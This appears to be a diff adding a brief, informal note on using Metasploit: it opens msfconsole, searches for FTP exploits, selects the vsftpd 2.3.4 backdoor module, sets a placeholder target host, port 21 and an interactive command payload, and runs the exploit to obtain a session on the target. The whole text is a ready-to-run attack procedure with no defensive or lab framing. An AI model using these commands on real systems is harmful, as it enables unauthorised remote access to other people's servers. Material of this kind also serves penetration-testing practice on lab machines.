@@ -1,0 +1,14 @@
+In linux
+
+  msfconsole
+search type:exploit name:ftp
+example result
+  exploit/unix/ftp/vsftpd_234_backdoor
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set RHOSTS <target_ip>
+set RPORT 21
+set PAYLOAD cmd/unix/interact
+exploit
+
+by expoit u will get session
